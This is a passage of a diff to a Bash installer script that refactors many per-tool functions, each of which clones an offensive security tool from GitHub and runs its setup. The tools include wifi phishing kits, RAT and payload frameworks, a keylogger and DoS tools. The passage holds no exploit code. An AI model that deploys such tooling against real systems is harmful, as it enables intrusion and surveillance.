+					if [[ "$foldname" != "" ]]
+					then
+						echo -e ""$YS"Removing: "$foldname""$CE""
+						rm -r /root/"$foldname"
+						cd
+						git clone $gitlink	
+						cd "$foldname"
+						return 1
+					fi
+			else
+				echo -e ""$YS"Removing old and install again?"$CE" ("$YS"y"$CE"/"$YS"n"$CE")"
+				read ROIN
+				if [[ "$ROIN" == "y" ]]
+				then
+					if [[ "$foldname" != "" ]]
+					then
+						echo -e ""$YS"Removing: "$foldname""$CE""
+						rm -r /root/"$foldname"
+						cd
+						git clone $gitlink	
+						cd "$foldname"
+						return 1
+					fi
+				else
+					return 0
+				fi
+			fi
+		else 
+			cd
+			git clone $gitlink	
+			cd "$foldname"
+			return 1
+		fi
+	}
 	function install_fluxion
 	{
-		if [[ -d "/root/fluxion" ]]
-		then
-			echo -e "Removing old..."
-			echo -e "$PAKTC"
-			$READAK
-			rm -r /root/fluxion
-		fi
-		echo -e "Installing fluxion"
-		echo -e "Tool by Deltaxflux"
-		sleep 1
-		cd
-		git clone --recursive https://github.com/FluxionNetwork/fluxion.git
-		cd /root/fluxion
-		./fluxion.sh
+		foldname="fluxion"
+		gitlink="--recursive  https://github.com/FluxionNetwork/fluxion.git"
+		install_default
 		#~ wget https://fluxion.tk/fluxion-unstable.zip
 		#~ apt-get install -y unzip
 		#~ clear
@@ -8812,21 +9779,14 @@ check_if_ks
 	}
 	function install_wifiphisher
 	{
-		if [[ -d "/root/wifiphisher" ]]
+		foldname="wifiphisher"
+		gitlink="https://github.com/wifiphisher/wifiphisher.git"
+		install_default
+		cloned=$?
+		if [[ "$cloned" == 1 ]]
 		then
-			echo -e "Removing old..."
-			echo -e "$PAKTC"
-			$READAK
-			rm -r /root/wifiphisher
+			sudo python setup.py install
 		fi
-		echo -e "Installing Wifiphisher"
-		echo -e "Tool idea by Dan McInerney"
-		sleep 1
-		cd
-		git clone https://github.com/wifiphisher/wifiphisher.git
-		cd wifiphisher
-		sudo python setup.py install
-		sleep 1
 	}
 	function install_zatacker
 	{
@@ -8836,20 +9796,14 @@ check_if_ks
 	}
 	function install_morpheus
 	{
-		if [[ -d "/root/morpheus" ]]
+		foldname="morpheus"
+		gitlink="https://github.com/r00t-3xp10it/morpheus.git"
+		install_default
+		cloned=$?
+		if [[ "$cloned" == 1 ]]
 		then
-			echo -e "Removing old..."
-			echo -e "$PAKTC"
-			$READAK
-			rm -r /root/morpheus
-		fi				
-		echo -e "Installing Morpheus"
-		echo -e "Tool by Pedro ubuntu  [ r00t-3xp10it ]"
-		sleep 1
-		cd
-		git clone https://github.com/r00t-3xp10it/morpheus.git
-		cd morpheus
-		chmod +x morpheus.sh
+			chmod +x morpheus.sh
+		fi
 	}
 	function install_osrframework
 	{
@@ -8857,70 +9811,48 @@ check_if_ks
 	}
 	function install_hakku
 	{
-		if [[ -d "/root/hakkuframework" ]]
+		foldname="hakkuframework"
+		gitlink="https://github.com/4shadoww/hakkuframework.git"
+		install_default
+		cloned=$?
+		if [[ "$cloned" == 1 ]]
 		then
-			echo -e "Removing old..."
-			echo -e "$PAKTC"
-			$READAK
-			rm -r /root/hakkuframework
-		fi		
-		echo -e "Installing Hakku"
-		echo -e "Tool by 4shadoww"
-		sleep 1
-		cd
-		git clone https://github.com/4shadoww/hakkuframework.git
-		cd hakkuframework
-		chmod +x hakku
-		chmod +x install
+			chmod +x hakku
+			chmod +x install
+		fi
 	}
 	function install_trity
 	{
-		if [[ -d "/root/Trity" ]]
+		foldname="Trity"
+		gitlink="https://github.com/toxic-ig/Trity.git"
+		install_default
+		cloned=$?
+		if [[ "$cloned" == 1 ]]
 		then
-			echo -e "Removing old..."
-			echo -e "$PAKTC"
-			$READAK
-			rm -r /root/Trity
-		fi		
-		echo -e "Installing Trity"
-		echo -e "Tool by Toxic-ig"
-		sleep 1
-		git clone https://github.com/toxic-ig/Trity.git
-		cd Trity
-		sudo python install.py	
+			sudo python install.py	
+		fi
 	}
 	function install_cupp
 	{
-		if [[ -d "/root/cupp" ]]
+		foldname="cupp"
+		gitlink="https://github.com/Mebus/cupp.git"
+		install_default
+		cloned=$?
+		if [[ "$cloned" == 1 ]]
 		then
-			echo -e "Removing old..."
-			echo -e "$PAKTC"
-			$READAK
-			rm -r /root/cupp
-		fi			
-		echo -e "Installing Cupp"
-		echo -e "Tool by Muris Kurgas"
-		sleep 1
-		cd
-		git clone https://github.com/Mebus/cupp.git
-		cd cupp
-		chmod +x cupp.py	
+			chmod +x cupp.py
+		fi
 	}
 	function install_dracnmap
 	{
-		if [[ -d "/root/Dracnmap" ]]
+		foldname="Dracnmap"
+		gitlink="https://github.com/Screetsec/Dracnmap.git"
+		install_default
+		cloned=$?
+		if [[ "$cloned" == 1 ]]
 		then
-			echo -e "Removing old..."
-			echo -e "$PAKTC"
-			$READAK
-			rm -r /root/Dracnmap
-		fi			
-		echo -e "Installing Dracnmap"
-		echo -e "Tool by Edo -maland-"
-		cd
-		git clone https://github.com/Screetsec/Dracnmap.git
-		cd Dracnmap
-		chmod +x Dracnmap.sh
+			chmod +x Dracnmap.sh
+		fi
 	}
 	function install_fern
 	{
@@ -8941,305 +9873,208 @@ check_if_ks
 	}
 	function install_kickthemout
 	{
-		if [[ -d "/root/kickthemout" ]]
-		then
-			echo -e "Removing old..."
-			echo -e "$PAKTC"
-			$READAK
-			rm -r /root/kickthemout
-		fi		
-		echo -e "Installing Kichthemout"
-		echo -e "Tool by Nikolaos Kamarinakis & David Schütz"
-		sleep 2
 		apt-get install -y nmap
-		git clone https://github.com/k4m4/kickthemout.git
-		cd kickthemout/
-		sudo python -m pip install -r requirements.txt
+		foldname="kickthemout"
+		gitlink="https://github.com/k4m4/kickthemout.git"
+		install_default
+		cloned=$?
+		if [[ "$cloned" == 1 ]]
+		then
+			sudo python -m pip install -r requirements.txt
+		fi
 	}
 	function install_ghostphisher
 	{
-		if [[ -d "/root/ghost-phisher" ]]
+		foldname="ghost-phisher"
+		gitlink="https://github.com/savio-code/ghost-phisher.git"
+		install_default
+		cloned=$?
+		if [[ "$cloned" == 1 ]]
 		then
-			echo -e "Removing old..."
-			echo -e "$PAKTC"
-			$READAK
-			rm -r /root/ghost-phisher
-		fi			
-		echo -e "Installing Ghost-Phisher"
-		echo -e "Tool by Savio-code"
-		sleep 1
-		cd
-		git clone https://github.com/savio-code/ghost-phisher.git
-		sleep 1
-		chmod +x /root/ghost-phisher/Ghost-Phisher/ghost.py
+			chmod +x /root/ghost-phisher/Ghost-Phisher/ghost.py
+		fi
 	}
 	function install_theeye
 	{
-		if [[ -d "/root/The-Eye" ]]
+		foldname="The-Eye"
+		gitlink="https://github.com/EgeBalci/The-Eye.git"
+		install_default
+		cloned=$?
+		if [[ "$cloned" == 1 ]]
 		then
-			echo -e "Removing old..."
-			echo -e "$PAKTC"
-			$READAK
-			rm -r /root/The-Eye
-		fi			
-		echo -e "Installing The Eye"
-		echo -e "Tool by EgeBalci"
-		sleep 1
-		cd
-		git clone https://github.com/EgeBalci/The-Eye.git
-		cd The-Eye
-		chmod +x TheEye	
+			chmod +x TheEye	
+		fi
 	}
 	function install_xerxes
 	{
-		if [[ -d "/root/xerxes" ]]
+		foldname="xerxes"
+		gitlink="https://github.com/zanyarjamal/xerxes.git"
+		install_default
+		cloned=$?
+		if [[ "$cloned" == 1 ]]
 		then
-			echo -e "Removing old..."
-			echo -e "$PAKTC"
-			$READAK
-			rm -r /root/xerxes
-		fi			
-		echo -e "Installing Xerxes"
-		echo -e "Tool by zanyarjamal"
-		cd
-		git clone https://github.com/zanyarjamal/xerxes
-		cd xerxes
-		gcc xerxes.c -o xerxes	
+			gcc xerxes.c -o xerxes	
+		fi
 	}
 	function install_mdk3
 	{
-		if [[ -d "/root/mdk3-master" ]]
+		foldname="mdk3-master"
+		gitlink="https://github.com/wi-fi-analyzer/mdk3-master.git"
+		install_default
+		cloned=$?
+		if [[ "$cloned" == 1 ]]
 		then
-			echo -e "Removing old..."
-			echo -e "$PAKTC"
-			$READAK
-			rm -r /root/mdk3-master
-		fi				
-		echo -e "Installing Mdk3-master"
-		echo -e "Tool by Musket Developer"
-		cd
-		git clone https://github.com/wi-fi-analyzer/mdk3-master.git
-		cd /root/mdk3-master
-		make
-		make install
+			make
+			make install
+		fi
 	}
 	function install_katana
 	{
-		if [[ -d "/root/KatanaFramework" ]]
+		foldname="KatanaFramework"
+		gitlink="https://github.com/PowerScript/KatanaFramework.git"
+		install_default
+		cloned=$?
+		if [[ "$cloned" == 1 ]]
 		then
-			echo -e "Removing old..."
-			echo -e "$PAKTC"
-			$READAK
-			rm -r /root/KatanaFramework
-		fi				
-		echo -e "Installing Katana framework"
-		echo -e "Tool by PowerScript"
-		cd
-		git clone https://github.com/PowerScript/KatanaFramework.git
-		cd KatanaFramework
-		sh dependencies
-		python install
+			sh dependencies
+			python install
+		fi
 	}
 	function install_airgeddon
 	{
-		if [[ -d "/root/airgeddon" ]]
+		foldname="airgeddon"
+		gitlink="https://github.com/v1s1t0r1sh3r3/airgeddon.git"
+		install_default
+		cloned=$?
+		if [[ "$cloned" == 1 ]]
 		then
-			echo -e "Removing old..."
-			echo -e "$PAKTC"
-			$READAK
-			rm -r /root/airgeddon
+			chmod +x airgeddon.sh
 		fi
-		echo -e "Installing..."
-		sleep 1
-		echo -e "Installing Airgeddon"
-		echo -e "Tool by v1s1t0r1sh3r3"
-		cd
-		git clone https://github.com/v1s1t0r1sh3r3/airgeddon.git
-		cd airgeddon
-		chmod +x airgeddon.sh
 	}
 	function install_4nonimizer
 	{
-		if [[ -d "/root/4nonimizer" ]]
+		foldname="4nonimizer"
+		gitlink="https://github.com/Hackplayers/4nonimizer.git"
+		install_default
+		cloned=$?
+		if [[ "$cloned" == 1 ]]
 		then
-			echo -e "Removing old..."
-			echo -e "$PAKTC"
-			$READAK
-			rm -r /root/4nonimizer
-		fi		
-		echo -e "Installing 4nonimizer"
-		echo -e "Tool by Hackplayers"
-		cd
-		git clone https://github.com/Hackplayers/4nonimizer.git
-		cd 4nonimizer
-		chmod +x 4nonimizer
-		./4nonimizer install
-		clear
-		cd
-		apt-get install -y python-pip
-		apt-get install -y php-curl
-		gem install pcaprub
-		gem install packetfu	
+			chmod +x 4nonimizer
+			./4nonimizer install
+			clear
+			cd
+			apt-get install -y python-pip
+			apt-get install -y php-curl
+			gem install pcaprub
+			gem install packetfu	
+		fi
 	}
 	function install_beelogger
 	{
-		if [[ -d "/root/BeeLogger" ]]
+		foldname="BeeLogger"
+		gitlink="https://github.com/4w4k3/BeeLogger.git"
+		install_default
+		cloned=$?
+		if [[ "$cloned" == 1 ]]
 		then
-			echo -e "Removing old..."
-			echo -e "$PAKTC"
-			$READAK
-			rm -r /root/BeeLogger
-		fi	
-		echo -e "Installing BeeLogger"
-		echo -e "Tool by Alisson Moretto - 4w4k3"
-		cd
-		git clone https://github.com/4w4k3/BeeLogger.git
-		cd BeeLogger
-		chmod +x install.sh
-		./install.sh
-		cd
-		apt-get install -y python-pip
-		apt-get install -y php-curl
-		gem install pcaprub
-		gem install packetfu
-		clear
+			chmod +x install.sh
+			./install.sh
+			cd
+			apt-get install -y python-pip
+			apt-get install -y php-curl
+			gem install pcaprub
+			gem install packetfu
+		fi
 	}
 	function install_ezsploit
 	{
-		if [[ -d "/root/ezsploit" ]]
+		foldname="ezsploit"
+		gitlink="https://github.com/rand0m1ze/ezsploit.git"
+		install_default
+		cloned=$?
+		if [[ "$cloned" == 1 ]]
 		then
-			echo -e "Removing old..."
-			echo -e "$PAKTC"
-			$READAK
-			rm -r /root/ezsploit
-		fi				
-		echo -e "Installing Ezsploit"
-		echo -e "Tool by rand0m1ze"
-		git clone https://github.com/rand0m1ze/ezsploit.git
-		cd ezsploit/
-		chmod +x ezsploit.sh
+			chmod +x ezsploit.sh
+		fi
 	}
 	function install_pupy
 	{
-		if [[ -d "/root/pupy" ]]
+		foldname="pupy"
+		gitlink="https://github.com/n1nj4sec/pupy.git"
+		install_default
+		cloned=$?
+		if [[ "$cloned" == 1 ]]
 		then
-			echo -e "Removing old..."
-			echo -e "$PAKTC"
-			$READAK
-			rm -r /root/pupy
-		fi			
-		echo -e "Installing Pupy"
-		echo -e "Tool by n1nj4sec"
-		cd
-		git clone https://github.com/n1nj4sec/pupy.git
-		cd /root/pupy
-		git submodule init
-		git submodule update
-		cd /root/pupy/pupy
-		pip install -r requirements.txt
-		cd
+			git submodule init
+			git submodule update
+			cd pupy
+			pip install -r requirements.txt
+		fi
 	}
 	function install_zirikatu
 	{
-		if [[ -d "/root/zirikatu" ]]
+		foldname="zirikatu"
+		gitlink="https://github.com/pasahitz/zirikatu.git"
+		install_default
+		cloned=$?
+		if [[ "$cloned" == 1 ]]
 		then
-			echo -e "Removing old..."
-			echo -e "$PAKTC"
-			$READAK
-			rm -r /root/zirikatu
-		fi		
-		echo -e "Installing Zirikatu"
-		echo -e "Tool by pasahitz"
-		cd
-		git clone https://github.com/pasahitz/zirikatu.git
-		cd zirikatu
-		chmod +x zirikatu.sh
+			chmod +x zirikatu.sh
+		fi
 	}
 	function install_wifiautopwner
 	{
-		if [[ -d "/root/WiFi-autopwner" ]]
-		then
-			echo -e "Removing old..."
-			echo -e "$PAKTC"
-			$READAK
-			rm -r /root/WiFi-autopwner
-		fi		
-		echo -e "Installing WiFi-autopwner"
-		echo -e "Tool by Mi-Al"
-		cd
-		git clone https://github.com/Mi-Al/WiFi-autopwner.git
+		foldname="WiFi-autopwner"
+		gitlink="https://github.com/Mi-Al/WiFi-autopwner.git"
+		install_default
 	}
 	function install_bully
 	{
-		if [[ -d "/root/bully" ]]
+		foldname="bully"
+		gitlink="https://github.com/aanarchyy/bully.git"
+		install_default
+		cloned=$?
+		if [[ "$cloned" == 1 ]]
 		then
-			echo -e "Removing old..."
-			echo -e "$PAKTC"
-			$READAK
-			rm -r /root/bully
-		fi				
-		echo -e "Installing Bully"
-		echo -e "Tool by Aanarchyy"
-		cd
-		git clone https://github.com/aanarchyy/bully.git
-		cd /root/bully/src
-		make
-		sudo make install	
-		cd	
+			cd src
+			make
+			sudo make install
+		fi		
 	}
 	function install_anonsurf
 	{
-		if [[ -d "/root/kali-anonsurf" ]]
+		foldname="kali-anonsurf"
+		gitlink="https://github.com/Und3rf10w/kali-anonsurf.git"
+		install_default
+		cloned=$?
+		if [[ "$cloned" == 1 ]]
 		then
-			echo -e "Removing old..."
-			echo -e "$PAKTC"
-			$READAK
-			rm -r /root/kali-anonsurf
-		fi		
-		cd
-		echo -e "Installing Anonsurf"
-		echo -e "Tool by Und3rf10w"
-		git clone https://github.com/Und3rf10w/kali-anonsurf.git
-		cd kali-anonsurf
-		chmod +x installer.sh
-		./installer.sh
-		sleep 1
-		cd
+			chmod +x installer.sh
+			./installer.sh
+		fi
 	}
 	function install_anonym8
 	{
-		if [[ -d "/root/anonym8" ]]
+		foldname="anonym8"
+		gitlink="https://github.com/HiroshiManRise/anonym8.git"
+		install_default
+		cloned=$?
+		if [[ "$cloned" == 1 ]]
 		then
-			echo -e "Removing old..."
-			echo -e "$PAKTC"
-			$READAK
-			rm -r /root/anonym8
-		fi		
-		echo -e "Installing Anonym8"
-		echo -e "Tool by HiroshiManRise"
-		git clone https://github.com/HiroshiManRise/anonym8.git
-		cd anonym8
-		chmod +x INSTALL.sh
-		./INSTALL.sh
-		sleep 1	
-		cd
+			chmod +x INSTALL.sh
+			./INSTALL.sh
+		fi
 	}
 	function install_thefatrat
 	{
-		if [[ -d "/root/TheFatRat" ]]
+		foldname="TheFatRat"
+		gitlink="https://github.com/Screetsec/TheFatRat.git"
+		install_default
+		cloned=$?
+		if [[ "$cloned" == 1 ]]
 		then
-			echo -e "Removing old..."
-			echo -e "$PAKTC"
-			$READAK
-			rm -r /root/TheFatRat
-		fi	
-		echo -e "Installing TheFatRat"
-		echo -e "Tool by Screetsec"
-		cd
-		git clone https://github.com/Screetsec/TheFatRat.git
-		cd TheFatRat
-		chmod +x setup.sh && ./setup.sh	
-		cd
+			chmod +x setup.sh && ./setup.sh	
+		fi
 	}
 	function install_angryip
 	{
@@ -9252,245 +10087,168 @@ check_if_ks
 		fi
 		echo -e "Downloading angryipscanner"
 		sleep 2
-		wget https://github.com/angryip/ipscan/releases/download/3.5.1/ipscan_3.5.1_amd64.deb
+		wget https://github.com/angryip/ipscan/releases/download/3.5.2/ipscan_3.5.2_amd64.deb
 		echo -e "Installing..."
-		dpkg -i ipscan_*
+		dpkg -i ipscan_3.5.2*
 		echo -e "Done"
 		sleep 1
 	}
 	function install_sniper
 	{
-		if [[ -d /root/Sn1per ]]
+		foldname="Sn1per"
+		gitlink="https://github.com/1N3/Sn1per.git"
+		install_default
+		cloned=$?
+		if [[ "$cloned" == 1 ]]
 		then
-			echo -e "Removing old..."
-			echo -e "$PAKTC"
-			$READAK
-			rm -r /root/Sn1per
+			chmod +x install.sh
+			./install.sh
 		fi
-		echo -e "Installing Sn1per"
-		echo -e "Tool by 1N3"
-		cd
-		git clone https://github.com/1N3/Sn1per.git
-		cd /root/Sn1per
-		chmod +x install.sh
-		./install.sh
-		cd
 	}
 	function install_recondog
 	{
-		if [[ -d /root/ReconDog ]]
-		then
-			echo -e "Removing old..."
-			echo -e "$PAKTC"
-			$READAK
-			rm -r /root/ReconDog
-		fi
-		cd
-		echo -e "Installing ReconDog"
-		echo -e "Tool by UltimateHackers"
-		git clone https://github.com/UltimateHackers/ReconDog.git
+		foldname="ReconDog"
+		gitlink="https://github.com/UltimateHackers/ReconDog.git"
+		install_default
 	}
 	function install_redhawk
 	{
-		if [[ -d /root/RED_HAWK ]]
-		then
-			echo -e "Removing old..."
-			echo -e "$PAKTC"
-			$READAK
-			rm -r /root/RED_HAWK
-		fi
-		cd
-		echo -e "Installing RED HAWK"
-		echo -e "Tool by Tuhinshubhra"
-		git clone https://github.com/Tuhinshubhra/RED_HAWK.git
+		foldname="RED_HAWK"
+		gitlink="https://github.com/Tuhinshubhra/RED_HAWK.git"
+		install_default
 	}
 	function install_winpayloads
 	{
-		if [[ -d /root/Winpayloads ]]
+		foldname="Winpayloads"
+		gitlink="https://github.com/nccgroup/Winpayloads.git"
+		install_default
+		cloned=$?
+		if [[ "$cloned" == 1 ]]
 		then
-			echo -e "Removing old..."
-			echo -e "$PAKTC"
-			$READAK
-			rm -r /root/Winpayloads
+			chmod +x setup.sh
+			./setup.sh
 		fi
-		cd
-		echo -e "Installing Winpayloads"
-		echo -e "Tool by Nccgroup"
-		git clone https://github.com/nccgroup/Winpayloads.git
-		cd /root/Winpayloads
-		chmod +x setup.sh
-		./setup.sh
-		cd
 	}
 	function install_chaos
 	{
 		apt install golang upx-ucl -y
 		cd
-		if [[ -d /root/CHAOS ]]
-		then
-			echo -e "Removing old..."
-			echo -e "$PAKTC"
-			$READAK
-			rm -r /root/CHAOS
-		fi
-		git clone https://github.com/tiagorlampert/CHAOS.git
+		foldname="CHAOS"
+		gitlink="https://github.com/tiagorlampert/CHAOS.git"
+		install_default
 	}
 	function install_routersploit
 	{
-		if [[ -d /root/routersploit ]]
+		foldname="routersploit"
+		gitlink="https://github.com/reverse-shell/routersploit.git"
+		install_default
+		cloned=$?
+		if [[ "$cloned" == 1 ]]
 		then
-			echo -e "Removing old..."
-			echo -e "$PAKTC"
-			$READAK
-			rm -r /root/routersploit
+			apt-get install python3-pip
+			python3 -m pip install -r requirements.txt
+			python setup.py install
 		fi
-		cd
-		echo -e "Installing routersploit"
-		echo -e "Tool by reverse-shell"
-		git clone https://github.com/reverse-shell/routersploit
-		cd /root/routersploit
-		pip install -r requirements.txt
-		cd
 	}
 	function install_infoga
 	{
-		if [[ -d /root/Infoga ]]
+		foldname="Infoga"
+		gitlink="https://github.com/m4ll0k/Infoga.git"
+		install_default
+		cloned=$?
+		if [[ "$cloned" == 1 ]]
 		then
-			echo -e "Removing old..."
-			echo -e "$PAKTC"
-			$READAK
-			rm -r /root/Infoga
+			pip install -r requirements.txt
 		fi
-		git clone https://github.com/m4ll0k/Infoga.git
-		cd /root/Infoga
-		pip install -r requirements.txt
-		cd
 	}
 	function install_nwatch
 	{
-		if [[ -d /root/nWatch ]]
+		foldname="nWatch"
+		gitlink="https://github.com/suraj-root/nWatch.git"
+		install_default
+		cloned=$?
+		if [[ "$cloned" == 1 ]]
 		then
-			echo -e "Removing old..."
-			echo -e "$PAKTC"
-			$READAK
-			rm -r /root/nWatch
+			pip install scapy
+			pip install colorama
+			pip install nmap
+			pip install ctypes
+			pip2.7 install scapy
+			pip2.7 install colorama
+			pip2.7 install nmap
+			pip2.7 install ctypes
 		fi
-		cd
-		echo -e "Installing nWatch"
-		echo -e "Tool by Suraj"
-		git clone https://github.com/suraj-root/nWatch.git
-		pip install scapy
-		pip install colorama
-		pip install nmap
-		pip install ctypes
-		pip2.7 install scapy
-		pip2.7 install colorama
-		pip2.7 install nmap
-		pip2.7 install ctypes
 	}
 	function install_eternalscanner
 	{
-		if [[ -d /root/eternal_scanner ]]
+		foldname="eternal_scanner"
+		gitlink="https://github.com/peterpt/eternal_scanner.git"
+		install_default
+		cloned=$?
+		if [[ "$cloned" == 1 ]]
 		then
-			echo -e "Removing old..."
-			echo -e "$PAKTC"
-			$READAK
-			rm -r /root/eternal_scanner
+			apt-get install -y masscan metasploit-framework
 		fi
-		cd
-		echo -e "Installing eternal_scanner"
-		echo -e "Tool by Peterpt"
-		git clone https://github.com/peterpt/eternal_scanner.git
-		apt-get install -y masscan metasploit-framework
 	}
 	function install_eaphammer
 	{
-		if [[ -d /root/eaphammer ]]
+		foldname="eaphammer"
+		gitlink="https://github.com/s0lst1c3/eaphammer.git"
+		install_default
+		cloned=$?
+		if [[ "$cloned" == 1 ]]
 		then
-			echo -e "Removing old..."
-			echo -e "$PAKTC"
-			$READAK
-			rm -r /root/eaphammer
+			chmod +x kali-setup
+			./kali-setup
+			apt-get install -y python-tqdm
 		fi
-		cd
-		echo -e "Installing eaphammer"
-		echo -e "Tool by s0lst1c3"
-		git clone https://github.com/s0lst1c3/eaphammer
-		cd eaphammer
-		chmod +x kali-setup
-		./kali-setup
-		cd
-		clear
-		apt-get install -y python-tqdm
 	}
 	function install_dagon
 	{
-		if [[ -d /root/dagon ]]
+		foldname="dagon"
+		gitlink="https://github.com/ekultek/dagon.git"
+		install_default
+		cloned=$?
+		if [[ "$cloned" == 1 ]]
 		then
-			echo -e "Removing old..."
-			echo -e "$PAKTC"
-			$READAK
-			rm -r /root/dagon
+			pip install -r requirements.txt
+			pip2.7 install -r requirements.txt
+			apt-get install -y bcrypt
 		fi
-		cd
-		echo -e "Installing Dagon"
-		echo -e "Tool by Ekultek"
-		git clone https://github.com/ekultek/dagon.git
-		cd dagon
-		pip install -r requirements.txt
-		pip2.7 install -r requirements.txt
-		apt-get install -y bcrypt
-		cd
 	}
 	function install_lalin
 	{
-		if [[ -d /root/LALIN ]]
+		foldname="LALIN"
+		gitlink="https://github.com/Screetsec/LALIN.git"
+		install_default
+		cloned=$?
+		if [[ "$cloned" == 1 ]]
 		then
-			echo -e "Removing old..."
-			echo -e "$PAKTC"
-			$READAK
-			rm -r /root/LALIN
+			chmod +x Lalin.sh
 		fi
-		cd
-		echo -e "Installing Lalin"
-		echo -e "Tool by Edo -maland-"
-		git clone https://github.com/Screetsec/LALIN.git
-		cd LALIN
-		chmod +x Lalin.sh
-		cd
 	}
 	function install_knockmail
 	{
-		if [[ -d /root/KnockMail ]]
+		foldname="KnockMail"
+		gitlink="https://github.com/4w4k3/KnockMail.git"
+		install_default
+		cloned=$?
+		if [[ "$cloned" == 1 ]]
 		then
-			echo -e "Removing old..."
-			echo -e "$PAKTC"
-			$READAK
-			rm -r /root/KnockMail
+			pip install -r requeriments.txt
 		fi
-		cd
-		echo -e "Installing KnockMail"
-		echo -e "Tool by 4w4k3"
-		git clone https://github.com/4w4k3/KnockMail.git
-		cd KnockMail
-		pip install -r requeriments.txt
-		cd
 	}
 	function install_kwetza
 	{
-		if [[ -d /root/kwetza ]]
+		foldname="kwetza"
+		gitlink="https://github.com/sensepost/kwetza.git"
+		install_default
+		cloned=$?
+		if [[ "$cloned" == 1 ]]
 		then
-			echo -e "Removing old..."
-			echo -e "$PAKTC"
-			$READAK
-			rm -r /root/kwetza
+			pip install beautifulsoup4
+			pip2.7 install beautifulsoup4
 		fi
-		cd
-		echo -e "Installing Kwetza"
-		echo -e "Tool by Sensepost"
-		https://github.com/sensepost/kwetza.git
-		pip install beautifulsoup4
-		pip2.7 install beautifulsoup4
 	}
 	function install_ngrok
 	{
@@ -9525,7 +10283,6 @@ check_if_ks
 	function install_shellter
 	{
 		apt-get install -y shellter
-		sleep 2
 	}
 	function install_geany
 	{
@@ -9565,32 +10322,21 @@ check_if_ks
 	}
 	function install_hashbuster
 	{
-		if [[ -d /root/Hash-Buster ]]
-		then
-			echo -e "Removing old..."
-			echo -e "$PAKTC"
-			$READAK
-			rm -r /root/Hash-Buster
-		fi
-		cd
-		git clone https://github.com/UltimateHackers/Hash-Buster.git
-		
+		foldname="Hash-Buster"
+		gitlink="https://github.com/UltimateHackers/Hash-Buster.git"
+		install_default
 	}
 	function install_findsploit
 	{
-		if [[ -d /root/Findsploit ]]
+		foldname="Findsploit"
+		gitlink="https://github.com/1N3/Findsploit.git"
+		install_default
+		cloned=$?
+		if [[ "$cloned" == 1 ]]
 		then
-			echo -e "Removing old..."
-			echo -e "$PAKTC"
-			$READAK
-			rm -r /root/Findsploit
+			chmod +x install.sh
+			./install.sh
 		fi
-		cd
-		git clone https://github.com/1N3/Findsploit.git
-		cd /root/Findsploit
-		chmod +x install.sh
-		./install.sh
-		cd
 	}
 	function install_howdoi
 	{
@@ -9599,259 +10345,139 @@ check_if_ks
 	}
 	function install_operative
 	{
-		if [[ -d /root/operative-framework ]]
+		foldname="operative-framework"
+		gitlink="https://github.com/graniet/operative-framework.git"
+		install_default
+		cloned=$?
+		if [[ "$cloned" == 1 ]]
 		then
-			echo -e "Removing old..."
-			echo -e "$PAKTC"
-			$READAK
-			rm -r /root/oparative-framework
+			pip install -r requirements.txt
+			pip2.7 install -r requirements.txt
 		fi
-		cd
-		git clone https://github.com/graniet/operative-framework.git
-		cd /root/operative-framework
-		pip install -r requirements.txt
-		pip2.7 install -r requirements.txt
 	}
 	function install_netattack2
 	{
-		if [[ -d "/root/netattack2" ]]
-		then
-			echo -e "Removing old..."
-			echo -e "$PAKTC"
-			$READAK
-			rm -r /root/netattack2
-		fi
-		cd
-		git clone https://github.com/chrizator/netattack2.git
+
+		foldname="netattack2"
+		gitlink="https://github.com/chrizator/netattack2.git"
+		install_default
 	}
 	function install_koadic
 	{
 		foldname="koadic"
 		gitlink="https://github.com/zerosum0x0/koadic.git"
-		if [[ "$foldname" = "" ]]
+		install_default
+		cloned=$?
+		if [[ "$cloned" == 1 ]]
 		then
-			exit
+			pip install -r requirements.txt
+			pip2.7 install -r requirements.txt
 		fi
-		if [[ -d "/root/"$foldname"" ]]
-		then
-			echo -e "Removing old..."
-			echo -e "$PAKTC"
-			$READAK
-			rm -r /root/"$foldname"
-		fi
-		cd
-		git clone $gitlink
-		cd /root/$foldname
-		pip install -r requirements.txt
-		pip2.7 install -r requirements.txt
-		cd
 	}
 	function install_empire
 	{
 		foldname="Empire"
 		gitlink="https://github.com/EmpireProject/Empire.git"
-		if [[ "$foldname" = "" ]]
+		install_default
+		cloned=$?
+		if [[ "$cloned" == 1 ]]
 		then
-			exit
+			chmod +x setup/install.sh
+			cd setup
+			./install.sh
+			./setup_database.py
 		fi
-		if [[ -d "/root/"$foldname"" ]]
-		then
-			echo -e "Removing old..."
-			echo -e "$PAKTC"
-			$READAK
-			rm -r /root/"$foldname"
-		fi
-		cd
-		git clone $gitlink
-		cd /root/$foldname
-		chmod +x setup/install.sh
-		cd setup
-		./install.sh
-		./setup_database.py
 	}
 	function install_meterpreter_paranoid_mode
 	{
 		foldname="Meterpreter_Paranoid_Mode-SSL"
 		gitlink="https://github.com/r00t-3xp10it/Meterpreter_Paranoid_Mode-SSL.git"
-		if [[ "$foldname" = "" ]]
-		then
-			exit
-		fi
-		if [[ -d "/root/"$foldname"" ]]
-		then
-			echo -e "Removing old..."
-			echo -e "$PAKTC"
-			$READAK
-			rm -r /root/"$foldname"
-		fi
-		cd
-		git clone $gitlink
+		install_default
 	}
 	function install_dropit_frmw
 	{
 		foldname="Dr0p1t-Framework"
 		gitlink="https://github.com/D4Vinci/Dr0p1t-Framework.git"
-		if [[ "$foldname" = "" ]]
+		install_default
+		cloned=$?
+		if [[ "$cloned" == 1 ]]
 		then
-			exit
+			cd
+			git clone $gitlink
+			chmod 777 -R Dr0p1t-Framework
+			cd Dr0p1t-Framework
+			chmod +x install.sh
+			./install.sh
 		fi
-		if [[ -d "/root/"$foldname"" ]]
-		then
-			echo -e "Removing old..."
-			echo -e "$PAKTC"
-			$READAK
-			rm -r /root/"$foldname"
-		fi
-		cd
-		git clone $gitlink
-		chmod 777 -R Dr0p1t-Framework
-		cd Dr0p1t-Framework
-		chmod +x install.sh
-		./install.sh	
-		#python Dr0p1t.py
 	}
 	function install_wifi_pumpkin
 	{
 		foldname="WiFi-Pumpkin"
 		gitlink="https://github.com/P0cL4bs/WiFi-Pumpkin.git"
-		if [[ "$foldname" = "" ]]
+		install_default
+		cloned=$?
+		if [[ "$cloned" == 1 ]]
 		then
-			exit
+			./installer.sh --install
 		fi
-		if [[ -d "/root/"$foldname"" ]]
-		then
-			echo -e "Removing old..."
-			echo -e "$PAKTC"
-			$READAK
-			rm -r /root/"$foldname"
-		fi
-		cd
-		git clone $gitlink
-		cd /root/$foldname
-		./installer.sh --install
 	}
 	function install_veil
 	{
 		foldname="Veil"
 		gitlink="https://github.com/Veil-Framework/Veil.git"
